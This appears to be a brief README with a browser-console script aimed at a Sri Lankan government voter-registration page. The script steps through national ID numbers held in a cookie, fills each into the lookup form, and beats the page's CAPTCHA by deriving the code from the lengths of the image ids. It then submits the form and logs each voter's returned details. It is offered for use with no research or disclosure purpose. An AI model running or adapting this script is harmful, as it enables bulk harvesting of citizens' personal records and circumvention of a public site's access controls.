# Srilanka user Information finder from (Government website url)/myVoterRegistration.aspx

Paste this code into your browser console.

```
    document.cookie = "nicnu=123456789";
    
    function getCookie(cname) {
        var name = cname + "=";
        var ca = document.cookie.split(';');
            for(var i = 0; i < ca.length; i++) {
                var c = ca[i];
                    while (c.charAt(0) == ' ') {
                        c = c.substring(1);
                    }
                    if (c.indexOf(name) == 0) {
                        return c.substring(name.length, c.length);
                    }
                }
            return "";
    }

var nicNumber = getCookie("nicnu");
var mynic = parseInt(nicNumber)+1;
document.getElementById("ContentPlaceHolder1_txtNIC").value = mynic+'v';
document.cookie = "nicnu="+mynic+"";

var num1 = document.getElementById('ContentPlaceHolder1_imbC1').getAttribute('src').replace('ShowImage.ashx?id=','').length;
var num2 = document.getElementById('ContentPlaceHolder1_imbC2').getAttribute('src').replace('ShowImage.ashx?id=','').length;
var num3 = document.getElementById('ContentPlaceHolder1_imbC3').getAttribute('src').replace('ShowImage.ashx?id=','').length;
var num4 = document.getElementById('ContentPlaceHolder1_imbC4').getAttribute('src').replace('ShowImage.ashx?id=','').length;
var num5 = document.getElementById('ContentPlaceHolder1_imbC5').getAttribute('src').replace('ShowImage.ashx?id=','').length;

var code = '';
document.getElementById("ContentPlaceHolder1_txtCode").value = code.concat(num1,num2,num3,num4,num5);
document.getElementById("ContentPlaceHolder1_cmdDisplay").click();
var element = document.getElementById('ContentPlaceHolder1_DetailsView');
var html = element.outerHTML;       
var data = { html: html }; 
var json = JSON.stringify(data);
console.log(json);

```
